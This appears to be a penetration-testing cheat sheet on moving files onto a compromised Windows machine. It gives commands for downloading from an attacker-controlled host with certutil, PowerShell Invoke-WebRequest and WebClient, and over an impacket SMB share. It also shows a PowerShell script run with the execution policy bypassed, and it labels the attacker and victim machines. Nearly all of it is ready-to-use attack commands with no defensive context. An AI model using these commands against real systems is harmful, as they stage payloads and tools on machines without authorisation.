# File Transfer

## Certutil.exe
```
certutil.exe -urlcache -split -f "http://ip:port/file" <output-file>
```

## Powershell
```
powershell Invoke-WebRequest "http://ip:port/file" -OutFile "<output-file>"
```

## Powershell wget file
```
echo $storageDir = $pwd > wget.ps1
echo $webclient = New-Object System.Net.WebClient >> wget.ps1
echo $url = “http://ip:port/file” >> wget.ps1
echo $file = “<output-file>” >> wget.ps1
echo $webclient.DownloadFile($url,$file) >> wget.ps1
```
```
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
```
## SMB
on attacker machine (kali)
```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py <share-name> <share-path>
```
on victim machine
```
net use \\attacker_ip\share_name
copy \\attacker_ip\share_name\file <output-file>
